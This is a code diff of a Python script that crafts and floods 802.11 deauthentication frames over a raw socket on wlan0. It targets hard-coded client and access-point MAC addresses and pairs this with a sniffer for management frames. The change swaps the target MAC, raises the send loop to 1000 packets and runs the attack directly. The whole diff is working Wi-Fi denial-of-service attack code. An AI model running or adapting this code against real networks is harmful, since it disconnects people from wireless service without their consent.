@@ -9,7 +9,8 @@ from scapy.all import conf, sendp, RadioTap, Dot11, Dot11Deauth, Dot11Auth
 from json import dumps
 from time import sleep
 
-client: str = 'd0:2b:20:85:4b:c6'
+client: str = '38:f9:d3:2c:3d:17'
+# client: str = 'd0:2b:20:85:4b:c6'
 bss_id: str = '70:f1:1c:15:15:b8'
 raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
 
@@ -18,13 +19,13 @@ def init_deauth():
     # deauth_packet_scapy: bytes = RadioTap() / \
     #                              Dot11(type=0, subtype=12, addr1=client, addr2=bss_id, addr3=bss_id) / \
     #                              Dot11Deauth(reason=7)
-    deauth_packet: bytes = iee.make_deauth(client_address=client, bss_id=bss_id, sequence_number=0)
-    for _ in range(100):
+    deauth_packet: bytes = iee.make_deauth(client_address=client, bss_id=bss_id, sequence_number=123, fragment_number=2)
+    for _ in range(1000):
         # sendp(deauth_packet_scapy, iface='wlan0')
         raw_socket.send(deauth_packet)
-        # base.print_info('Send deauth packet from: ', bss_id, ' to: ', client,
-        #                 ' sequence: ', '0')
-        sleep(0.1)
+        base.print_info('Send deauth packet from: ', bss_id, ' to: ', client,
+                        ' sequence: ', '0')
+        sleep(10)
 
 
 def deauth(request):
@@ -65,7 +66,7 @@ if __name__ == "__main__":
 
     # region Start sniffer
     raw_socket.bind(('wlan0', 0))
-    tm.add_task(init_deauth)
+    init_deauth()
     print('test')
     sniff.start(protocols=['Radiotap', '802.11'], prn=deauth, network_interface='wlan0',
                 filters={'802.11': {'type': 0xc0, 'bss id': bss_id, 'source': client, 'destination': bss_id}})
